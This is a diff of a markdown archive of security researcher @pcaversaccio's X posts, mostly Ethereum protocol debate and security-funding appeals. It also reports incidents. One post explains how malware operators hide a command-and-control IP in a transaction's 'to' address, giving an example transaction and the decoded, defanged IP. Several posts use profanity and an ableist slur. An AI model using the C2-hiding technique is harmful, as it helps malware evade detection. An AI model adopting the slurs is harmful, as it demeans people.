@@ -1,9 +1,9 @@
 # @pcaversaccio — full verbatim X archive (security-relevant posts)
 
-_Generated 2026-11-15 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
+_Generated 2026-11-16 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 283
-- Conversations/threads: 214
+- Posts in this file: 433
+- Conversations/threads: 363
 - Oldest post captured: 2022-06-18
 - Newest post captured: 2026-11-12
 
@@ -33,18 +33,891 @@ _Generated 2026-11-15 from the X API (full-archive search + timeline). Every pos
 
 ---
 
-## 2026-09-03 · Post · i believe long-term any hard-fork-related client (el &amp; cl) changes must be formally verified. i 
+## 2026-11-05 · Post · so if we want ethereum to win (first we need to survive, tbh lol), we need to fund its security. the
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge, Memory corruption / native
+
+
+### Post — @pcaversaccio — 2026-11-05 11:52 UTC (2026-11-05 12:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2118310410680230035
+- Metrics (at fetch): bookmark 24, impression 11151, like 189, quote 4, reply 22, retweet 30
+
+> so if we want ethereum to win (first we need to survive, tbh lol), we need to fund its security. there are no shortcuts here guys. onchain security is everyone's problem, not someone else's job. TheDAO Security Fund (where i'm a curator, so yes, i'm totally biased) has a number of open security initiatives that deserve your attention and, more importantly, your funding. if your protocol depends on ethereum security work getting done, put in 10-15% and let TheDAO Security Fund help raise the rest. it's a lot cheaper than funding the entire thing yourself. and pledges are only collected once an initiative is fully funded. no free-riding. no money collected for initiatives that don't make it.
+>
+> my personal top two picks are (remember i'm biased obviously so go thru them by yourself :)):
+> - formally verified Vyper compiler (https://initiatives.thedao.fund/initiative/vyper-verified-compilation-and-secure-language-upgrades)
+> - production-ready local-first Safe UI (https://initiatives.thedao.fund/initiative/production-ready-local-first-safe-ui)
+>
+> ethereum's security won't fucking fund itself. stop treating it as somebody else's problem. put some skin in the game.
+>
+> http://initiatives.thedao.fund
+>
+> PS: info on this second round https://paragraph.com/@thedao.fund/round-two-starts-today-ethsecurity-initiatives
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HWW_TX0bwAAiqom.jpg — no alt text provided by author
+
+**Links in post:** https://initiatives.thedao.fund/initiative/vyper-verified-compilation-and-secure-language-upgrades, https://initiatives.thedao.fund/initiative/production-ready-local-first-safe-ui, http://initiatives.thedao.fund, https://paragraph.com/@thedao.fund/round-two-starts-today-ethsecurity-initiatives
+
+
+---
+
+## 2026-11-03 · Post · ethereum changed the world because it refused to fit in. it was weird, paranoid, adversarial, techni
+
+
+### Post — @pcaversaccio — 2026-11-03 22:50 UTC (2026-11-03 23:50 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2117751411429474701
+- Metrics (at fetch): bookmark 45, impression 22403, like 732, quote 14, reply 40, retweet 115
+
+> ethereum changed the world because it refused to fit in. it was weird, paranoid, adversarial, technical, uncapturable and contrarian. and it will keep changing the world for as long as it refuses to become what everyone else wants it to be. ethereum is not here to serve someone else's agenda, validate someone else's worldview or become infra for someone else's empire. if you want ethereum to play by your rules, you're probably part of the problem.
+
+
+---
+
+## 2026-10-27 · Post · apparently 4 is the new 256-bit security standard. eMudhra walked so GoAhead could crawl. 😭😭 [pic.x.
+
+
+### Post — @pcaversaccio — 2026-10-27 18:26 UTC (2026-10-27 19:26 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2115148267940119039
+- Metrics (at fetch): bookmark 272, impression 76015, like 2155, quote 21, reply 26, retweet 148
+
+> apparently 4 is the new 256-bit security standard. eMudhra walked so GoAhead could crawl. 😭😭 [pic.x.com/ydZT0VFIpa] https://twitter.com/4A4133/status/2114822201555943763
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HVqDL4PbQAAjVse.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/4A4133/status/2114822201555943763
+
+**Quoted post (full text):**
+
+    #### Quoted post — @128391252 — 2026-10-26 20:51 UTC (2026-10-26 21:51 WAT)
+    
+    - URL: https://x.com/128391252/status/2114822201555943763
+    - Metrics (at fetch): bookmark 2747, impression 1160090, like 3753, quote 460, reply 161, retweet 592
+    
+    > Announcing 3 Critical vulns for hundreds of millions of IoT, Firewalls, OT, and Military devices including: Palo Alto Networks, Comcast, D-Link, HP, Canon, Honeywell, GE, Oracle, Siemens, Rockwell, Digi, Lockheed Martin, Boeing... 
+    >
+    > The vulns are with GoAhead Web Server which is a backend library used by these devices. There's a patch available from GoAhead but that doesn't mean there's a patch available for the devices yet -- that's up to the manufacturer.
+    >
+    > - TLS traffic over DHE ciphers have a 1-byte secret, "04", meaning anyone can decrypt connections to these devices and steal login credentials and session tokens if the client negotiated with DHE ciphers like the latest TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256, which is extremely likely.
+    >
+    > - LibreSSL mTLS has been completely bypassed, meaning anyone can connect over mTLS. If you have one of these devices listening on the internet and are expecting mTLS to protect it from attackers, take it offline or patch asap.
+    >
+    > - OpenSSL Certificate Revocation Lists (CRLs) are not enforced, meaning if a user device is stolen or compromised, and you revoke that mTLS cert, nothing actually happens. There are a lot of other attacks this can be used for.
+    >
+    > These are critical because these types of devices run our world. Water systems, electricity, military, firewalls, critical infrastructure.
+    >
+    > https://foxio.io/blog/choose-your-backend-three-tls-bugs-in-goahead
+    
+    **Links in post:** https://foxio.io/blog/choose-your-backend-three-tls-bugs-in-goahead
+    
+
+
+---
+
+## 2026-10-23 · Post · look the foundational problem with ethereum protocol design is that most of the people designing the
+
+
+### Post — @pcaversaccio — 2026-10-23 12:45 UTC (2026-10-23 13:45 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2113612790212808867
+- Metrics (at fetch): bookmark 110, impression 135285, like 1553, quote 48, reply 134, retweet 119
+
+> look the foundational problem with ethereum protocol design is that most of the people designing the protocol don't actually use ethereum themselves. you can't fix the right things if you don't use your own fucking product. you don't have enough skin in the game if you don't personally depend on the system you're designing & stand to lose money when it breaks. i understand, everything looks great from an ivory tower lol. things look very different when you're actually on the ground dealing with the consequences. if you don't use ethereum yourself but still think you're qualified to design its protocol, you're playing god with a system you don't have to live with and whose consequences you don't have to suffer.
+
+
+---
+
+## 2026-10-21 · Post · for anyone that thinks eip-8037/8038 is still a good idea, pls take a look at the latest @chain_secu
+
+
+### Post — @pcaversaccio — 2026-10-21 16:51 UTC (2026-10-21 17:51 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2112949950464270463
+- Metrics (at fetch): bookmark 8, impression 4296, like 70, quote 1, reply 8, retweet 9
+
+> for anyone that thinks eip-8037/8038 is still a good idea, pls take a look at the latest @chain_security article. these eips can _force_ certain contracts to upgrade just to restore their intended behaviour, despite _zero_ bytecode changes. if a hard fork can break the intended behaviour of deployed contracts w/o changing a single byte of their code, what guarantees does code immutability actually provide on Ethereum?
+> https://www.chainsecurity.com/blog/glamsterdam-gas/index.html
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HVKxFnUa0AA_NBO.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/pcaversaccio/status/2112943153183645980, https://www.chainsecurity.com/blog/glamsterdam-gas/index.html
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-10-21 16:24 UTC (2026-10-21 17:24 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2112943153183645980
+    - Metrics (at fetch): bookmark 0, impression 3951, like 6, quote 1, reply 1, retweet 0
+    
+    > @trent_vanepps @lightclients re 2) i made it an agenda point in tomorrow's ACDE, not re the privacy topic we discuss here, but due to security considerations https://github.com/ethereum/pm/issues/2267#issuecomment-6320847921 [pic.x.com/3hhEwhrayx]
+    
+    **Media:**
+    - media `3_2112943123248898048` (details not returned by the API)
+    
+    **Links in post:** https://github.com/ethereum/pm/issues/2267#issuecomment-6320847921
+    
+
+
+---
+
+## 2026-10-21 · Thread · so i keep looking into eip-8037 & eip-8038 and i'm wondering the impact on privacy apps; ie. on a hi
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-10-21 12:31 UTC (2026-10-21 13:31 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2112884438065725451
+- Metrics (at fetch): bookmark 6, impression 3743, like 27, quote 0, reply 4, retweet 0
+
+> so i keep looking into eip-8037 & eip-8038 and i'm wondering the impact on privacy apps; ie. on a high-level on-chain privacy needs 3 things:
+> - a fresh identity per tx
+> - state written per use (commitments, nullifiers,...)
+> - a way to pay gas w/o relinking the identity
+> these two EIPs reprice all 3. neither one analyses the effect on privacy apps.
+
+
+### Thread part 2 — @pcaversaccio — 2026-10-21 16:24 UTC (2026-10-21 17:24 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2112943153183645980
+- Metrics (at fetch): bookmark 0, impression 3951, like 6, quote 1, reply 1, retweet 0
+
+> @trent_vanepps @lightclients re 2) i made it an agenda point in tomorrow's ACDE, not re the privacy topic we discuss here, but due to security considerations https://github.com/ethereum/pm/issues/2267#issuecomment-6320847921 [pic.x.com/3hhEwhrayx]
+
+**Media:**
+- media `3_2112943123248898048` (details not returned by the API)
+
+**Links in post:** https://github.com/ethereum/pm/issues/2267#issuecomment-6320847921
+
+
+---
+
+## 2026-10-21 · Post · trying to understand something very important; pls participate in this poll 👇 https://twitter.com/pc
+
+
+### Post — @pcaversaccio — 2026-10-21 14:21 UTC (2026-10-21 15:21 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2112912196346982862
+- Metrics (at fetch): bookmark 3, impression 3791, like 21, quote 0, reply 0, retweet 0
+
+> trying to understand something very important; pls participate in this poll 👇 https://twitter.com/pcaversaccio/status/2112910910612447389
+
+**Links in post:** https://twitter.com/pcaversaccio/status/2112910910612447389
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-10-21 14:16 UTC (2026-10-21 15:16 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2112910910612447389
+    - Metrics (at fetch): bookmark 3, impression 7473, like 31, quote 1, reply 11, retweet 10
+    
+    > if you're an app-layer dev or an Ethereum power user, have you looked at the Glamsterdam EIPs or provided feedback to the core devs over the past 1.5 years?
+    
+
+
+---
+
+## 2026-10-21 · Post · if you're an app-layer dev or an Ethereum power user, have you looked at the Glamsterdam EIPs or pro
+
+
+### Post — @pcaversaccio — 2026-10-21 14:16 UTC (2026-10-21 15:16 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2112910910612447389
+- Metrics (at fetch): bookmark 3, impression 7473, like 31, quote 1, reply 11, retweet 10
+
+> if you're an app-layer dev or an Ethereum power user, have you looked at the Glamsterdam EIPs or provided feedback to the core devs over the past 1.5 years?
+
+
+---
+
+## 2026-10-17 · Post · well good news, it's a simple Unix timestamp 🙃 https://www.anthropic.com/research/ecdsa-curve-origin
+
+
+### Post — @pcaversaccio — 2026-10-17 07:22 UTC (2026-10-17 08:22 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2111357269065523307
+- Metrics (at fetch): bookmark 11, impression 5568, like 71, quote 0, reply 7, retweet 1
+
+> well good news, it's a simple Unix timestamp 🙃 https://www.anthropic.com/research/ecdsa-curve-origins https://twitter.com/pcaversaccio/status/1715021011576320011
+
+**Links in post:** https://www.anthropic.com/research/ecdsa-curve-origins, https://twitter.com/pcaversaccio/status/1715021011576320011
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2023-10-19 15:04 UTC (2023-10-19 16:04 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/1715021011576320011
+    - Metrics (at fetch): bookmark 9, impression 27315, like 98, quote 2, reply 4, retweet 9
+    
+    > 1/ ETH wouldn't exist w/o validated cryptographic primitives. Now, EIP-7212 introduces a P-256 (secp256r1 EC) precompile. But, for P256, the seed is c49d360886e704936a6678e1139d26b7819f7e90 and we still don’t know how it has been exactly calculated! We want to change that! [pic.x.com/bDIveDAo2Y] https://twitter.com/merkleplant_eth/status/1715015864750342473
+    
+    **Media:**
+    - media `3_1715018089685737472` (details not returned by the API)
+    - media `3_1715018109319311360` (details not returned by the API)
+    - media `3_1715018133235187712` (details not returned by the API)
+    
+    **Links in post:** https://twitter.com/merkleplant_eth/status/1715015864750342473
+    
+    **Quoted post** 1715015864750342473: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-10-16 · Post · alright, i keep looking into the Glamsterdam EIPs. let's take EIP-8246: https://eips.ethereum.org/EI
+
+
+Tags (automatic): Smart contract / DeFi, Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-10-16 14:52 UTC (2026-10-16 15:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2111108120990892251
+- Metrics (at fetch): bookmark 13, impression 4302, like 66, quote 2, reply 12, retweet 4
+
+> alright, i keep looking into the Glamsterdam EIPs. let's take EIP-8246: https://eips.ethereum.org/EIPS/eip-8246. we have more than 26,792 ETH sitting in major burn addresses. EIP-8246 wants to remove the remaining SELFDESTRUCT burn mechanics (see my quoted tweet, where i showcase the mechanics to be removed). and yes, it's correct that this mechanism is barely used in practice (unfortunately). but that's my challenge: is this not a failure on our part to make the possibility more prominent? i mean, i literally spoke to various smart contract devs today. _none_ (no joking) of them knew that you could _truly_ burn ETH at the protocol level. so, hmmmmm, instead of continuing to send eth to dead addresses, we should make "irreversible" burning more accessible if you ask me. even better, we should introduce a first-class burn primitive w/o requiring some fancy EVM magic. ulitmately, ETH sitting in dead addresses is effectively useless (unless i find their pk one day with my 24M-qubit machine lol), but it still exists in the protocol's state. irreversibly destroying ETH would actually remove it from the supply and makes it "cleaner".
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HUwlwB_a0AAIMok.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HUwlxBDbAAEOfh2.jpg — no alt text provided by author
+
+**Links in post:** https://eips.ethereum.org/EIPS/eip-8246, https://twitter.com/pcaversaccio/status/1749845349999505914
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2024-01-23 17:23 UTC (2024-01-23 18:23 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/1749845349999505914
+    - Metrics (at fetch): bookmark 18, impression 17053, like 93, quote 4, reply 9, retweet 7
+    
+    > May I present you the "The Ultimate Ether Burning Factory Contract"! Ever wanted to know how it feels to burn ether (literally removing it from the total supply)? Wait no longer. Call `yolo` and witness some EVM magic in action. The feeling is mesmerising. [pic.x.com/aPdXUnAuZ0]
+    
+    **Media:**
+    - media `3_1749845227030953984` (details not returned by the API)
+    
+
+
+---
+
+## 2026-10-16 · Post · fuck you Farcaster [pic.x.com/JOANfRuMdp]
+
+
+### Post — @pcaversaccio — 2026-10-16 13:51 UTC (2026-10-16 14:51 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2111092708659867816
+- Metrics (at fetch): bookmark 12, impression 7817, like 231, quote 5, reply 10, retweet 14
+
+> fuck you Farcaster [pic.x.com/JOANfRuMdp]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HUwboQDWcAAm_U1.jpg — no alt text provided by author
+
+
+---
+
+## 2026-10-15 · Post · i'm trying to catch up today with all Glamsterdam EIPs and i don't understand why EIP-7997 (https://
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-10-15 15:27 UTC (2026-10-15 16:27 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2110754372397514809
+- Metrics (at fetch): bookmark 13, impression 5423, like 56, quote 0, reply 4, retweet 2
+
+> i'm trying to catch up today with all Glamsterdam EIPs and i don't understand why EIP-7997 (https://eips.ethereum.org/EIPS/eip-7997) is planned for inclusion. my CreateX factory (https://github.com/pcaversaccio/createx) is deployed on over 200 EVM chains (verifiable to have the exact init & runtime bytecode), myriads of protocols use it in a _robust_ way to deploy their protocols, and its deployment (yes, there are tradeoffs here) scales way better (there are literally 3 different  - wrt gaslimit - presigned deployment txs available) than what is proposed here (good luck waiting for eg Filecoin to upgrade). i haven't been really involved in the convo, so if i missed anything important, tell me, but this is actually a _solved_ problem and we don't need to add additional burden on client codes.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HUrlcawbYAAHyPE.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HUrllsnbUAAO2Fc.jpg — no alt text provided by author
+
+**Links in post:** https://eips.ethereum.org/EIPS/eip-7997, https://github.com/pcaversaccio/createx
+
+
+---
+
+## 2026-10-15 · Post · osaka vs. amsterdam gas diff for a simple CREATE2ed erc-20 mock contract (note that the additional s
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-10-15 14:38 UTC (2026-10-15 15:38 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2110742093861724530
+- Metrics (at fetch): bookmark 13, impression 4180, like 61, quote 1, reply 6, retweet 2
+
+> osaka vs. amsterdam gas diff for a simple CREATE2ed erc-20 mock contract (note that the additional state gas for the SSTOREs of 64*1,530=97,920 from EIP-8037 is only visible in the CREATE2 line for the amsterdam line, tenderly should fix this tbh). welcome to the hypergas world and well, i guess, hurry up and initialise your storage before Glamsterdam goes live 🙃
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HUraT9Wa0AAUT5G.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HUrbmNYbQAADh6X.jpg — no alt text provided by author
+
+
+---
+
+## 2026-10-07 · Post · ok someone finally deployed the DAO proposal to add 0.01, 0.03, 0.3, 3, and 30 ETH Tornado Cash pool
+
+
+### Post — @pcaversaccio — 2026-10-07 11:52 UTC (2026-10-07 12:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2107801221071507671
+- Metrics (at fetch): bookmark 14, impression 10763, like 148, quote 2, reply 14, retweet 13
+
+> ok someone finally deployed the DAO proposal to add 0.01, 0.03, 0.3, 3, and 30 ETH Tornado Cash pools (we've asked the Tornado Cash community a few days ago to deploy this if anyone thinks it's valuable); personally i strongly second this proposal as it will help retail users and increase usage (particularly the 0.01 ETH pool). i hope the DAO voters see the merit of this proposal and will accept it.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HUBnpALa0AAkASX.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HUBnqLtbgAAsy-O.jpg — no alt text provided by author
+
+
+---
+
+## 2026-10-07 · Post · i was off by ~1 year; it took only 2 years to realise. good. https://twitter.com/pcaversaccio/status
+
+
+### Post — @pcaversaccio — 2026-10-07 07:39 UTC (2026-10-07 08:39 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2107737446003974358
+- Metrics (at fetch): bookmark 5, impression 8682, like 100, quote 0, reply 12, retweet 4
+
+> i was off by ~1 year; it took only 2 years to realise. good. https://twitter.com/pcaversaccio/status/1862933207227756821
+
+**Links in post:** https://twitter.com/pcaversaccio/status/1862933207227756821
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2024-11-30 18:54 UTC (2024-11-30 19:54 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/1862933207227756821
+    - Metrics (at fetch): bookmark 5, impression 30773, like 147, quote 2, reply 16, retweet 13
+    
+    > Sooner or later, we'll come to a powerful realisation: the most pivotal move for L2s will be acknowledging that, in the long run, we may not need them at all. In hindsight, Layer 2 solutions will appear as temporary stopgaps. Not now, not in 6 months, but in 3-5 years' time. That's my bet.
+    
+
+
+---
+
+## 2026-09-26 · Post · we're heading towards complete retardation man. the vast majority of the world is not fucking ready 
+
+
+### Post — @pcaversaccio — 2026-09-26 09:56 UTC (2026-09-26 10:56 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2103785672373104828
+- Metrics (at fetch): bookmark 66, impression 33185, like 500, quote 25, reply 63, retweet 48
+
+> we're heading towards complete retardation man. the vast majority of the world is not fucking ready for self-sovereignty and probably never will be. wallets have sucked ass at protecting normal users for over a decade. seed phrases & private keys are an utterly shit security model for humans (oh, and multisigs are great but people protect their 3/5 multisig with the same seed, so also full retard mode). and yet we're still pretending this is the future of finance. it's fucking not. most of this industry is a VC exit-liquidity circle jerk where the end user ultimately eats the loss in some form. maybe the answer isn't mass adoption. maybe the answer is staying fucking small. small, weird, technical, paranoid, adversarial, and hard to capture. the smaller and more niche we stay, the more dangerous and long-lasting this industry becomes. being small is a feature.
+
+
+---
+
+## 2026-09-20 · Post · lol nah, privacy is _not_ dead, we've just built the wrong defaults so far. any kind of privacy must
+
+
+### Post — @pcaversaccio — 2026-09-20 09:28 UTC (2026-09-20 10:28 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2101604296290607327
+- Metrics (at fetch): bookmark 15, impression 14620, like 270, quote 3, reply 39, retweet 38
+
+> lol nah, privacy is _not_ dead, we've just built the wrong defaults so far. any kind of privacy must be part of the _runtime_ (can be an execution layer, can be a browser, etc.), not something users have to configure. that's why i've been saying for years: we must ship _L1 enshrined unconditional_ privacy. if the default tx is private by default, you scale privacy and you win. i won't stop until i can replace my xmr txs with eth txs. build the right system defaults, and you win. ethereum enshrined privacy will win.
+
+**Links in post:** https://twitter.com/gakonst/status/2101382182799552834
+
+**Quoted post (full text):**
+
+    #### Quoted post — @804029200315334656 — 2026-09-19 18:45 UTC (2026-09-19 19:45 WAT)
+    
+    - URL: https://x.com/804029200315334656/status/2101382182799552834
+    - Metrics (at fetch): bookmark 55, impression 66073, like 320, quote 18, reply 69, retweet 7
+    
+    > the main thing i think about is how dead privacy is from here on forward
+    
+
+
+---
+
+## 2026-09-19 · Post · if you're building a self-custodial _software_ wallet, add _max_ friction to creating hot wallets & 
+
+
+### Post — @pcaversaccio — 2026-09-19 11:11 UTC (2026-09-19 12:11 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2101267883946897684
+- Metrics (at fetch): bookmark 9, impression 13743, like 115, quote 3, reply 30, retweet 10
+
+> if you're building a self-custodial _software_ wallet, add _max_ friction to creating hot wallets & push users toward hardware wallets. idgaf if it hurts onboarding. your main job is keeping users' funds safe and in a world full of malware, making hot wallets the easy default is fucking _reckless_.
+
+
+---
+
+## 2026-09-18 · Post · so remember when certain DPRK groups stored their C2 infra details (often base64-encoded & XOR-encry
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-09-18 10:28 UTC (2026-09-18 11:28 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2100894782545711213
+- Metrics (at fetch): bookmark 169, impression 24631, like 353, quote 3, reply 22, retweet 40
+
+> so remember when certain DPRK groups stored their C2 infra details (often base64-encoded & XOR-encrypted) in smart contracts? it was called EtherHiding. well, our PolinRider "friends" (and other groups) have gotten a bit more "creative". they now use a new pattern called "NullReceiver": simply put, they send a zero-value tx with zero calldata, while hiding the C2 IP address directly in the `to` address lol. let's take real-world example:
+> - tx hash: `0x910d35c6620bea357c867bd93b291dc6feb1990bb57a0a063fa652cd29d096b2`
+> - `to` address: `0xa658863ea658863e68656c6c6f6970626f742121`
+> this will lead to
+> - a658863e -> 166[.]88[.]134[.]62
+> - a658863e -> repetition of the above IP
+> - the rest (68656c6c6f6970626f742121) is some string "helloipbot!!"
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HSfc3sLbIAArcQf.jpg — no alt text provided by author
+
+
+---
+
+## 2026-09-12 · Post · KYC = Kill Your Customer https://twitter.com/IntCyberDigest/status/2098704229913202728
+
+
+### Post — @pcaversaccio — 2026-09-12 17:39 UTC (2026-09-12 18:39 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2098828840839602338
+- Metrics (at fetch): bookmark 16, impression 24254, like 434, quote 5, reply 11, retweet 54
+
+> KYC = Kill Your Customer https://twitter.com/IntCyberDigest/status/2098704229913202728
+
+**Links in post:** https://twitter.com/IntCyberDigest/status/2098704229913202728
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1831435289341894656 — 2026-09-12 09:24 UTC (2026-09-12 10:24 WAT)
+    
+    - URL: https://x.com/1831435289341894656/status/2098704229913202728
+    - Metrics (at fetch): bookmark 4221, impression 3524564, like 11897, quote 845, reply 451, retweet 2420
+    
+    > ‼️ BREAKING: Revolut handed over customers’ passport copies, verification selfies and full transaction histories to a malicious actor.
+    >
+    > The actor sent lawful government information-demand emails using a genuine government domain that passed domain authentication.
+    >
+    > Revolut later concluded they were not authentic.
+    >
+    > Affected customers were notified on Friday. What may have been disclosed ranges from name, date of birth and home address to account statements, withdrawal records and complete Bitcoin transaction history.
+    >
+    > The company says it has alerted the agency to the unauthorised mailbox on its domain, blocked the address and begun notifying regulators.
+    >
+    > It has not named the agency, explained how someone obtained a mailbox there, or given a number of affected customers.
+    >
+    > ZachXBT, who circulated the notices, believes the incident was limited in size and aimed at high-net-worth users.
+    
+    **Media:**
+    - media `3_2098704223659778049` (details not returned by the API)
+    - media `3_2098704223538159616` (details not returned by the API)
+    
+
+
+---
+
+## 2026-09-11 · Post · ok wtf is going on - 10mins after my first tweet ICANN changed the status again to "active". this is
+
+
+### Post — @pcaversaccio — 2026-09-11 10:16 UTC (2026-09-11 11:16 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2098355017925431337
+- Metrics (at fetch): bookmark 0, impression 5520, like 21, quote 1, reply 6, retweet 0
+
+> ok wtf is going on - 10mins after my first tweet ICANN changed the status again to "active". this is gonna be an interesting Friday. [pic.x.com/UuQAkNHbwd] https://twitter.com/pcaversaccio/status/2098348014020739396
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HR7Z1lebEAAp8Y2.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/pcaversaccio/status/2098348014020739396
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-09-11 09:48 UTC (2026-09-11 10:48 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2098348014020739396
+    - Metrics (at fetch): bookmark 6, impression 8415, like 59, quote 1, reply 5, retweet 6
+    
+    > so some "good" news - the malicious (i.e. the current ui deployment steals notes) tornado[.]cash domain is now finally on "clientHold" status; in simple terms the registrar (TLD Registrar Solutions Ltd.) has told the registry (Binky Moon, LLC) _not_ to publish/activate the domain's dns. so i sincerely hope this will prevent further losses and my personal wish is that the domain can be returned eventually to Roman (after expiration).
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HR7Tvq4acAAZJ64.jpg — no alt text provided by author
+    - photo: https://pbs.twimg.com/media/HR7TxgQaUAAGIbg.jpg — no alt text provided by author
+    
+
+
+---
+
+## 2026-09-11 · Post · so some "good" news - the malicious (i.e. the current ui deployment steals notes) tornado[.]cash dom
+
+
+### Post — @pcaversaccio — 2026-09-11 09:48 UTC (2026-09-11 10:48 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2098348014020739396
+- Metrics (at fetch): bookmark 6, impression 8415, like 59, quote 1, reply 5, retweet 6
+
+> so some "good" news - the malicious (i.e. the current ui deployment steals notes) tornado[.]cash domain is now finally on "clientHold" status; in simple terms the registrar (TLD Registrar Solutions Ltd.) has told the registry (Binky Moon, LLC) _not_ to publish/activate the domain's dns. so i sincerely hope this will prevent further losses and my personal wish is that the domain can be returned eventually to Roman (after expiration).
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HR7Tvq4acAAZJ64.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HR7TxgQaUAAGIbg.jpg — no alt text provided by author
+
+
+---
+
+## 2026-09-09 · Post · https://mempool.space/tx/f7055f6c8dd00f404e48c12483ae740180f658db206733505bb27b015e579588 [pic.x.com
+
+
+### Post — @pcaversaccio — 2026-09-09 10:23 UTC (2026-09-09 11:23 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2097632049012289989
+- Metrics (at fetch): bookmark 15, impression 12653, like 134, quote 2, reply 8, retweet 12
+
+> https://mempool.space/tx/f7055f6c8dd00f404e48c12483ae740180f658db206733505bb27b015e579588 [pic.x.com/WUAEIlZ2U7]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HRxJF81bUAAPnI9.png — no alt text provided by author
+
+**Links in post:** https://mempool.space/tx/f7055f6c8dd00f404e48c12483ae740180f658db206733505bb27b015e579588
+
+
+---
+
+## 2026-09-07 · Post · it's great seeing blockstream following the standard security practice so white hats can easily reac
+
+
+### Post — @pcaversaccio — 2026-09-07 16:15 UTC (2026-09-07 17:15 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2096995716367634595
+- Metrics (at fetch): bookmark 4, impression 6100, like 42, quote 0, reply 5, retweet 1
+
+> it's great seeing blockstream following the standard security practice so white hats can easily reach out, well guess, nooooot looool [pic.x.com/bpqTVWZHOc] https://twitter.com/Rob1Ham/status/2096988476327534923
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HRoGRVdbwAAHhF9.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/Rob1Ham/status/2096988476327534923
+
+**Quoted post (full text):**
+
+    #### Quoted post — @50535198 — 2026-09-07 15:46 UTC (2026-09-07 16:46 WAT)
+    
+    - URL: https://x.com/50535198/status/2096988476327534923
+    - Metrics (at fetch): bookmark 62, impression 546068, like 630, quote 76, reply 92, retweet 76
+    
+    > 3,400 BTC just returned to the liquid federation. Looks like ~600 BTC stayed behind. [pic.x.com/u8VeT1Bqyu] https://twitter.com/Rob1Ham/status/2096671192228741515
+    
+    **Media:**
+    - media `3_2096988370920407040` (details not returned by the API)
+    
+    **Links in post:** https://twitter.com/Rob1Ham/status/2096671192228741515
+    
+    **Quoted post** 2096671192228741515: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
